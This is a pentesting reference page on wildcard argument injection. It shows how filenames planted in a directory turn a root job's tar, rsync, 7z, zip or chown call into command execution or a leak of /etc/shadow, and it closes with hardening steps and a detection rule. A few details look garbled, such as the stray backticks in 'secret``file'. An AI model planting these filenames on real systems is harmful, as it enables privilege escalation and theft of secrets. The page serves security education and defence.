# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** happens when a privileged script runs a Unix binary such as `tar`, `chown`, `rsync`, `zip`, `7z`, … with an unquoted wildcard like `*`.  
> Since the shell expands the wildcard **before** executing the binary, an attacker who can create files in the working directory can craft filenames that begin with `-` so they are interpreted as **options instead of data**, effectively smuggling arbitrary flags or even commands.  
> This page collects the most useful primitives, recent research and modern detections for 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:

```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```

When root later executes something like:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

`--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
See also the classic DefenseCode paper for details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute arbitrary commands by abusing the **checkpoint** feature:

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

Once root runs e.g. `tar -czf /root/backup.tgz *`, `shell.sh` is executed as root.

### bsdtar / macOS 14+

The default `tar` on recent macOS (based on `libarchive`) does *not* implement `--checkpoint`, but you can still achieve code-execution with the **--use-compress-program** flag that allows you to specify an external compressor.

```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
When a privileged script runs `tar -cf backup.tar *`, `/bin/sh` will be started. 

---

## rsync

`rsync` lets you override the remote shell or even the remote binary via command-line flags that start with `-e` or `--rsync-path`:

```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

If root later archives the directory with `rsync -az * backup:/srv/`, the injected flag spawns your shell on the remote side.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Even when the privileged script *defensively* prefixes the wildcard with `--` (to stop option parsing), the 7-Zip format supports **file list files** by prefixing the filename with `@`.  Combining that with a symlink lets you *exfiltrate arbitrary files*:

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

If root executes something like:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip will attempt to read `root.txt` (→ `/etc/shadow`) as a file list and will bail out, **printing the contents to stderr**.

---

## zip

`zip` supports the flag `--unzip-command` that is passed *verbatim* to the system shell when the archive will be tested:

```bash
zip result.zip files -T --unzip-command "sh -c id"
```

Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## Detection & Hardening

1. **Disable shell globbing** in critical scripts: `set -f` (`set -o noglob`) prevents wildcard expansion.
2. **Quote or escape** arguments: `tar -czf "$dst" -- *` is *not* safe — prefer `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Explicit paths**: Use `/var/www/html/*.log` instead of `*` so attackers cannot create sibling files that start with `-`.
4. **Least privilege**: Run backup/maintenance jobs as an unprivileged service account instead of root whenever possible.
5. **Monitoring**: Elastic’s pre-built rule *Potential Shell via Wildcard Injection* looks for `tar --checkpoint=*`, `rsync -e*`, or `zip --unzip-command` immediately followed by a shell child process. The EQL query can be adapted for other EDRs. 

---

## References

* Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)  
* Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)

{{#include ../../banners/hacktricks-training.md}}
